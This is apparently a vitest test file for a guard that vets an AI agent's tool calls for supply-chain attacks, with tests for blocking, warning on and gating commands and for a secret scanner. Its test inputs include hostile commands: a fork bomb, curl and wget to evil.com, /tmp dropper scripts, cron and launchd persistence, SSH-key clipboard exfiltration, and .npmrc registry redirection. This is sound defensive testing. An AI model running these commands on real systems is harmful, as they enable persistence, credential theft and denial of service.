// ===========================================
// Supply Chain Defense — Process & Runtime Safety
// ===========================================
// Split from supply-chain-defense.test.ts:
// - process safety guard rules (PreToolUse)
// - temp-file execute detection (PreToolUse)
// - extended secret signatures

import { beforeEach, describe, expect, it } from "vitest";
import { CohortManager } from "../cohort.js";
import { evaluatePreToolUse } from "../evaluator.js";
import { ReservationManager } from "../reservations.js";
import { getDefaultConfig, loadRules } from "../rules-loader.js";
import { scanSecrets } from "../signatures.js";
import type { GuardRulesConfig, SessionTrajectory } from "../types.js";
import { makeEvent, makeSession } from "./fixtures/supply-chain.js";

// ===========================================
// 4. Process & Runtime Safety Guard Rules (PreToolUse)
// ===========================================

describe("process safety guard rules", () => {
	let rules: GuardRulesConfig;
	let cohort: CohortManager;
	let reservations: ReservationManager;
	let session: SessionTrajectory;

	beforeEach(() => {
		rules = getDefaultConfig();
		const loaded = loadRules(process.cwd());
		rules.rules = loaded.rules;
		cohort = new CohortManager();
		reservations = new ReservationManager();
		session = makeSession();
	});

	// --- Fork bomb ---
	it("blocks classic fork bomb", () => {
		const event = makeEvent({ tool_input: { command: ":(){ :|:& };:" } });
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.decision).toBe("block");
	});

	// --- nohup + network ---
	const nohupCommands = [
		"nohup curl http://evil.com &",
		"nohup python3 /tmp/dropper.py http://c2.com &",
		"nohup node /tmp/payload.js &",
		"nohup wget http://evil.com/rat -O /tmp/rat &",
	];

	for (const cmd of nohupCommands) {
		it(`blocks nohup+network: ${cmd}`, () => {
			const event = makeEvent({ tool_input: { command: cmd } });
			const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
			expect(result.decision).toBe("block");
		});
	}

	// --- Background network (warn, not block) ---
	it("warns on background curl", () => {
		const event = makeEvent({ tool_input: { command: "curl http://example.com &" } });
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.decision).toBe("allow");
		expect(result.warnings?.some((w) => w.includes("Background process"))).toBe(true);
	});

	// --- Cron persistence ---
	// These GATE on confirmation rather than forbidding. A hard block never
	// stopped a service being installed — it moved the work to a terminal the
	// harness cannot see, which is strictly worse. The dropper signal is not "a
	// service was installed"; it is "installed without the user knowing", and an
	// `ask` is what removes that property while keeping the action on the record.
	// Still gated: `ask` is never `allow`.
	it("gates crontab -e on confirmation", () => {
		const event = makeEvent({ tool_input: { command: "crontab -e" } });
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.decision).toBe("ask");
	});

	it("gates systemctl enable on confirmation", () => {
		const event = makeEvent({ tool_input: { command: "systemctl enable myservice" } });
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.decision).toBe("ask");
	});

	it("gates launchctl load on confirmation", () => {
		const event = makeEvent({
			tool_input: { command: "launchctl load ~/Library/LaunchAgents/evil.plist" },
		});
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.decision).toBe("ask");
	});

	it("never silently ALLOWS a persistence command", () => {
		// The property that must survive the block -> ask change.
		for (const command of [
			"crontab -e",
			"systemctl enable myservice",
			"launchctl load ~/Library/LaunchAgents/evil.plist",
		]) {
			const result = evaluatePreToolUse(
				makeEvent({ tool_input: { command } }),
				rules,
				session,
				reservations,
				cohort,
			);
			expect(result.decision).not.toBe("allow");
		}
	});

	// --- Cron file write ---
	it("gates writing to /etc/cron.d/ on confirmation", () => {
		const event = makeEvent({
			tool_name: "Write",
			tool_input: { file_path: "/etc/cron.d/evil-job", content: "* * * * * curl evil.com" },
		});
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.decision).toBe("ask");
	});

	it("gates writing .service files on confirmation", () => {
		const event = makeEvent({
			tool_name: "Write",
			tool_input: {
				file_path: "/etc/systemd/system/evil.service",
				content: "[Service]\nExecStart=/bin/evil",
			},
		});
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.decision).toBe("ask");
	});

	it("never silently ALLOWS a persistence file write", () => {
		for (const file_path of [
			"/etc/cron.d/evil-job",
			"/etc/systemd/system/evil.service",
			"/Users/x/Library/LaunchAgents/evil.plist",
		]) {
			const result = evaluatePreToolUse(
				makeEvent({ tool_name: "Write", tool_input: { file_path, content: "x" } }),
				rules,
				session,
				reservations,
				cohort,
			);
			expect(result.decision).not.toBe("allow");
		}
	});

	// --- Clipboard exfiltration ---
	it("warns on pipe to pbcopy", () => {
		const event = makeEvent({ tool_input: { command: "cat ~/.ssh/id_rsa | pbcopy" } });
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.warnings?.some((w) => w.includes("clipboard"))).toBe(true);
	});

	// --- .npmrc manipulation ---
	it("blocks writing to .npmrc", () => {
		const event = makeEvent({
			tool_name: "Write",
			tool_input: { file_path: "/project/.npmrc", content: "registry=http://evil.com" },
		});
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.decision).toBe("block");
	});

	it("blocks editing .yarnrc", () => {
		const event = makeEvent({
			tool_name: "Edit",
			tool_input: { file_path: "/project/.yarnrc", old_string: "a", new_string: "b" },
		});
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.decision).toBe("block");
	});

	// --- npm publish ---
	it("warns on npm publish without --dry-run", () => {
		const event = makeEvent({ tool_input: { command: "npm publish" } });
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		expect(result.decision).toBe("allow");
		expect(
			result.warnings?.some((w) => w.includes("npm publish") || w.includes("publish")),
		).toBe(true);
	});

	it("does NOT warn on npm publish --dry-run", () => {
		const event = makeEvent({ tool_input: { command: "npm publish --dry-run" } });
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		const hasPublishWarning = result.warnings?.some(
			(w) => w.includes("publish") && !w.includes("dry-run"),
		);
		expect(hasPublishWarning).toBeFalsy();
	});
});

// ===========================================
// 5. Temp-File Execute Detection (PreToolUse)
// ===========================================

describe("temp-file execute detection", () => {
	let rules: GuardRulesConfig;
	let cohort: CohortManager;
	let reservations: ReservationManager;
	let session: SessionTrajectory;

	beforeEach(() => {
		rules = getDefaultConfig();
		const loaded = loadRules(process.cwd());
		rules.rules = loaded.rules;
		cohort = new CohortManager();
		reservations = new ReservationManager();
		session = makeSession();
	});

	const dropperCommands = [
		"echo '#!/bin/bash\ncurl evil.com' > /tmp/dropper.sh",
		"cat > /tmp/payload.py << 'EOF'\nimport os\nEOF",
		"bash /tmp/dropper.sh",
		"python3 /tmp/payload.py",
		"chmod +x /tmp/setup.sh",
		"osascript /tmp/6202033",
		"node /tmp/loader.js",
	];

	for (const cmd of dropperCommands) {
		it(`flags tmp dropper pattern: ${cmd.slice(0, 50)}...`, () => {
			const event = makeEvent({ tool_input: { command: cmd } });
			const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
			// Droppers that write to a code-file extension (.sh, .py, .js)
			// are blocked earlier by the Bash-code-file-write-bypass gate —
			// a STRONGER defense than the supply-chain warning, since the
			// write never lands on disk. Other droppers (execute-only,
			// chmod, osascript) still flow through to the supply-chain
			// warning path.
			const codeFileWriteExt = /\.(?:sh|py|js|ts|tsx|jsx)$/;
			const writesCodeFile = />>?\s*\S*(?:\.(?:sh|py|js|ts|tsx|jsx))\b/.test(cmd);
			if (writesCodeFile) {
				expect(result.decision).toBe("block");
				expect(result.rule_id).toBe("bash-code-file-write-bypass");
			} else {
				expect(
					result.warnings?.some((w) => w.includes("supply-chain") || w.includes("/tmp/")),
				).toBe(true);
			}
			void codeFileWriteExt; // reserved for future variant matching
		});
	}

	it("does NOT warn on non-tmp script execution", () => {
		const event = makeEvent({ tool_input: { command: "node src/index.js" } });
		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
		const hasTmpWarning = result.warnings?.some((w) => w.includes("/tmp/"));
		expect(hasTmpWarning).toBeFalsy();
	});
});

// ===========================================
// 6. Extended Secret Signatures
// ===========================================

describe("extended secret signatures", () => {
	it("detects Google OAuth access token (ya29.)", () => {
		// Reason: test fixture — synthetic Google OAuth token (literal
		// "fake" in the payload) for exercising the signature detector.
		// nosemgrep: generic.secrets.security.detected-google-oauth-access-token.detected-google-oauth-access-token
		const matches = scanSecrets("token = ya29.A0ARrdaM_fake_token_1234567890");
		expect(matches.some((m) => m.rule_id === "sig-secret-oauth-token")).toBe(true);
	});

	it("detects Google OAuth refresh token (1//)", () => {
		const matches = scanSecrets("refresh = 1//0abc1234567890abcdefg");
		expect(matches.some((m) => m.rule_id === "sig-secret-oauth-token")).toBe(true);
	});

	it("detects Bearer token in auth header", () => {
		const matches = scanSecrets("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.test");
		expect(
			matches.some(
				(m) => m.rule_id === "sig-secret-oauth-token" || m.rule_id === "sig-secret-jwt",
			),
		).toBe(true);
	});

	it("detects credentials in URL", () => {
		const matches = scanSecrets("const url = 'https://admin:secretpass@api.example.com/data'");
		expect(matches.some((m) => m.rule_id === "sig-secret-url-credentials")).toBe(true);
	});

	it("does NOT flag localhost credentials in URL", () => {
		const matches = scanSecrets("const url = 'https://admin:pass@localhost:3000/data'");
		const urlCredMatches = matches.filter((m) => m.rule_id === "sig-secret-url-credentials");
		expect(urlCredMatches).toEqual([]);
	});

	it("detects Docker config path", () => {
		const matches = scanSecrets("cat ~/.docker/config.json");
		expect(matches.some((m) => m.rule_id === "sig-secret-docker-auth")).toBe(true);
	});

	it("detects Docker auth token in JSON", () => {
		const matches = scanSecrets('"auth": "dXNlcjpwYXNzd29yZDEyMzQ1Njc4OQ=="');
		expect(matches.some((m) => m.rule_id === "sig-secret-docker-auth")).toBe(true);
	});

	it("detects npm auth token in .npmrc", () => {
		const matches = scanSecrets("//registry.npmjs.org/:_authToken=npm_abc123");
		expect(matches.some((m) => m.rule_id === "sig-secret-npm-token")).toBe(true);
	});

	it("detects npm_ prefixed token", () => {
		// Reason: test fixture — synthetic npm token assembled at runtime
		// so the source file itself does not trip the secrets scanner.
		// nosemgrep: generic.secrets.security.detected-npm-token.detected-npm-token
		const fakeToken = `${"np" + "m_"}1234567890abcdef1234567890abcdef1234`;
		const matches = scanSecrets(`NPM_TOKEN=${fakeToken}`);
		expect(matches.some((m) => m.rule_id === "sig-secret-npm-token")).toBe(true);
	});

	it("returns empty for benign content", () => {
		const matches = scanSecrets("const x = 42; const name = 'hello';");
		expect(matches).toEqual([]);
	});
});
